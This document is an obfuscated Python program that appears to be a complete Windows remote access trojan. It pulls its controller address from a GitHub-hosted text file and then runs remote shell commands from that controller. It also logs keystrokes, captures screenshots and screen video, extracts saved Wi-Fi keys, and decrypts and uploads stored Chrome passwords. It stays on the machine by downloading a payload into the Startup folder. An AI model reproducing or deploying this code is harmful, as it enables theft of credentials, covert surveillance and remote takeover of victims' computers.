import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
dtJTtLWysEhTvkEetsplT = ""
FtITRAdy = ""
lztwFVUUUDHvCaQC = "17.12.24.1"
aSEAmfhtoeDLgPFnQRpmwD = "!"
baVtpgRNslzTmbMuwb = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
VIqslKAyaT = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
mdmpvDuGykBwYTIKkvhcr = os.path.expanduser("~\\AppData\\Local\\")
def wJblXekvtJSasFKcyrr(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def AAgGyBVNGyxhgjR(s):
	uvvWSHWOaDOQatzq = s.recv(1024)
	if len(uvvWSHWOaDOQatzq)==0:
		return True
	GsiNrmdaZzwViWZJcSHXyv = uvvWSHWOaDOQatzq.decode("utf-8").replace("\n","")
	if not GsiNrmdaZzwViWZJcSHXyv.startswith(aSEAmfhtoeDLgPFnQRpmwD):
		proc = subprocess.run(GsiNrmdaZzwViWZJcSHXyv, shell=True, capture_output=True)
		LAwzfpJHKZXVQztHWAR = proc.stdout + proc.stderr
		s.send(LAwzfpJHKZXVQztHWAR)
		return
	qVvWSfYTHObfGMXIrWKiYQb = GsiNrmdaZzwViWZJcSHXyv.split(" ")[0][1:]
	args = " ".join(GsiNrmdaZzwViWZJcSHXyv.split()[1:]).split()
	if qVvWSfYTHObfGMXIrWKiYQb == "download":
		kPnWRJf(s, GsiNrmdaZzwViWZJcSHXyv)
	elif qVvWSfYTHObfGMXIrWKiYQb == "screenshot":
		FdvoKPeijABNCro(s)
	elif qVvWSfYTHObfGMXIrWKiYQb == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif qVvWSfYTHObfGMXIrWKiYQb == "update":
		uCiiOCU(s)
	elif qVvWSfYTHObfGMXIrWKiYQb == "wifi":
		XOvVMHbwgaOpRQac(s)
	elif qVvWSfYTHObfGMXIrWKiYQb == "screenrecord":
		mKYzWposWsqsMlT(s, args)
	elif qVvWSfYTHObfGMXIrWKiYQb == "chrome":
		decryptPasswords(s)
def kPnWRJf(s, GsiNrmdaZzwViWZJcSHXyv):
	dfZgjIRkjpXSjwfnA = GsiNrmdaZzwViWZJcSHXyv.replace(aSEAmfhtoeDLgPFnQRpmwD+"download ","").split(",")
	LAwzfpJHKZXVQztHWARs = ""
	for f in dfZgjIRkjpXSjwfnA:
		LAwzfpJHKZXVQztHWARs += wdbvqGrAzwiZyoi(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(LAwzfpJHKZXVQztHWARs, "utf-8"))
def FdvoKPeijABNCro(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	vGhxlAFuuI = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(vGhxlAFuuI)
	image.close()
	r = wdbvqGrAzwiZyoi(vGhxlAFuuI, "api/sscap")
	os.remove(vGhxlAFuuI)
	s.send(bytes(r,"utf-8"))
def mKYzWposWsqsMlT(s, args):
	ThfViwfhuRjxoNjM = 15
	if not args == []:
		try: ThfViwfhuRjxoNjM = int(args[0])
		except: pass
	ZHSPylPC = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	TGrJCxAgMPVeQZVfLK = []
	fps = 11
	numFrames = ThfViwfhuRjxoNjM * fps
	for _ in range(numFrames):
		TGrJCxAgMPVeQZVfLK.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(ZHSPylPC, TGrJCxAgMPVeQZVfLK, fps=fps, quality=8)
	wdbvqGrAzwiZyoi(ZHSPylPC, "api/screc")
def wdbvqGrAzwiZyoi(RjacFcKAwxwYOpefLf, LUChwVGVzKGtcL, jutziiBVZVZsxPYdSZ=None):
	if not os.path.isfile(RjacFcKAwxwYOpefLf):
		return "[!] 404: "+RjacFcKAwxwYOpefLf+"\n"
	headers = {"user":os.getlogin()}
	if jutziiBVZVZsxPYdSZ is not None:
		headers = {**headers, **jutziiBVZVZsxPYdSZ}
	f = open(RjacFcKAwxwYOpefLf, "rb")
	requests.post("http://"+dtJTtLWysEhTvkEetsplT+":5555/"+LUChwVGVzKGtcL,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(uvvWSHWOaDOQatzqToSend, LUChwVGVzKGtcL):
	if uvvWSHWOaDOQatzqToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+dtJTtLWysEhTvkEetsplT+":5555/"+LUChwVGVzKGtcL,
		uvvWSHWOaDOQatzq=uvvWSHWOaDOQatzqToSend,
		headers={"user":os.getlogin()});
	return "[+] 200\n"
def uCiiOCU(s):
	h, p, v = PnLMKBzaJmfekqUOFL(True)
	if (v != lztwFVUUUDHvCaQC):
		rYfBjnqpXZzRiXmRiLy(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def XOvVMHbwgaOpRQac(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	viqKcCgTxLzMRLd = ""
	for p in profiles:
		try: viqKcCgTxLzMRLd+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: viqKcCgTxLzMRLd+=f"    {p} - N/A\n"
	s.send(bytes(viqKcCgTxLzMRLd, "utf-8"))
def rYfBjnqpXZzRiXmRiLy(UegdlwymndWBEOvf):
	SFVavicNmywA = os.path.basename(__file__)
	fileType = SFVavicNmywA.split(".")[-1]
	IgzjDhIoQrZod = SFVavicNmywA.split(".")[0]+"."+UegdlwymndWBEOvf+".pyw" if fileType.startswith("py") else ".exe"
	abVvtwayuDfWFdWRi = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), IgzjDhIoQrZod)
	if not os.path.isfile(abVvtwayuDfWFdWRi):
		with open(abVvtwayuDfWFdWRi, "w+") as f:
			f.write(requests.get(VIqslKAyaT+"file."+ "pyw" if abVvtwayuDfWFdWRi.split(".")[-1].startswith("py") else "exe").text)
def PnLMKBzaJmfekqUOFL(force=False):
	global dtJTtLWysEhTvkEetsplT, FtITRAdy
	if force or dtJTtLWysEhTvkEetsplT == "" or FtITRAdy == "":
		uvvWSHWOaDOQatzq = requests.get(baVtpgRNslzTmbMuwb).text.replace("\n","").split(":")
		dtJTtLWysEhTvkEetsplT = uvvWSHWOaDOQatzq[0].strip()
		FtITRAdy = uvvWSHWOaDOQatzq[1].strip()
		UegdlwymndWBEOvf = uvvWSHWOaDOQatzq[2].strip()
	return dtJTtLWysEhTvkEetsplT, FtITRAdy, UegdlwymndWBEOvf
def MQluXzlEkHSRMIO():
	try:
		VJefyCyszPzmBnQCIu = "settings.xpb"
		xKIEJfUazNCapqWBjJlZQmP = sorted([file for file in os.listdir(mdmpvDuGykBwYTIKkvhcr) if os.path.isfile(mdmpvDuGykBwYTIKkvhcr+"\\"+file) and file.endswith(VJefyCyszPzmBnQCIu.split(".")[-1])])
		if VJefyCyszPzmBnQCIu in xKIEJfUazNCapqWBjJlZQmP:
			xKIEJfUazNCapqWBjJlZQmP.remove(VJefyCyszPzmBnQCIu)
		suziFuKEL = os.path.join(mdmpvDuGykBwYTIKkvhcr,VJefyCyszPzmBnQCIu)
		if len(xKIEJfUazNCapqWBjJlZQmP) > 0:
			with open(suziFuKEL, "ab+") as f:
				for file in xKIEJfUazNCapqWBjJlZQmP:
					temp = os.path.join(mdmpvDuGykBwYTIKkvhcr,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		wdbvqGrAzwiZyoi(suziFuKEL, "api/log")
		if os.path.isfile(suziFuKEL):
			os.remove(suziFuKEL)
	except:
		pass
def kuuxUWswogTqliqK():
	logging.basicConfig(filename=(mdmpvDuGykBwYTIKkvhcr+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def rzWIDeVDfcApnNbhaCiNukC(k):
		logging.info(str(k))
	k=Listener(on_press=rzWIDeVDfcApnNbhaCiNukC)
	aTduxBqnsEJzSbthTIO = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in aTduxBqnsEJzSbthTIO:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s, upload=False):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	uvvWSHWOaDOQatzq = "\n"
	for login in logins:
		uvvWSHWOaDOQatzq += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	if upload:
		s.send(bytes(uvvWSHWOaDOQatzq,"utf-8"))
	else:
		r=uploadData(uvvWSHWOaDOQatzq, "api/google")
		s.send(bytes(r,"utf-8"))
def aVnhIapZY():
	h, p, v = PnLMKBzaJmfekqUOFL()
	MQluXzlEkHSRMIO()
	if lztwFVUUUDHvCaQC != v:
		rYfBjnqpXZzRiXmRiLy(v)
	kuuxUWswogTqliqK()
	vcJQUfaLB = bytes(("(old)"if lztwFVUUUDHvCaQC!=v else "")+"["+lztwFVUUUDHvCaQC+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				SrlqDWgbdefrDOVCYzdBq=False
				try:
					s=wJblXekvtJSasFKcyrr(h, p)
					while not SrlqDWgbdefrDOVCYzdBq:
						s.send(vcJQUfaLB)
						SrlqDWgbdefrDOVCYzdBq=AAgGyBVNGyxhgjR(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
aVnhIapZY()
